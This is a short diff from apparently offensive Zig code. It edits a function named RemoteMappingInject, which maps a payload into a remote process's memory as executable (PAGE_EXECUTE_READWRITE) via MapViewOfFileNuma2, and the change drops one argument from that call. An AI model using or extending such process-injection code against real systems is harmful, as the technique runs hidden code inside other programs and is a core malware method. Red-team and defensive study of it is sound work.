@@ -176,7 +176,7 @@ pub fn RemoteMappingInject(rhProcess: HANDLE, pPayload: [*]const u8, sPayloadSiz
 
 
 
-   MapRemoteAddress = MapViewOfFileNuma2(FileHandle.?, rhProcess, 0, null, 0, 0, windows.PAGE_EXECUTE_READWRITE,NUMA_NO_PREFERRED_NODE);
+   MapRemoteAddress = MapViewOfFileNuma2(FileHandle.?, rhProcess, 0, null, 0, 0, windows.PAGE_EXECUTE_READWRITE);
     std.debug.print("MapRemoteAddress: 0x{x}\n", .{@intFromPtr(MapRemoteAddress)});
 
     if (MapRemoteAddress != null) {
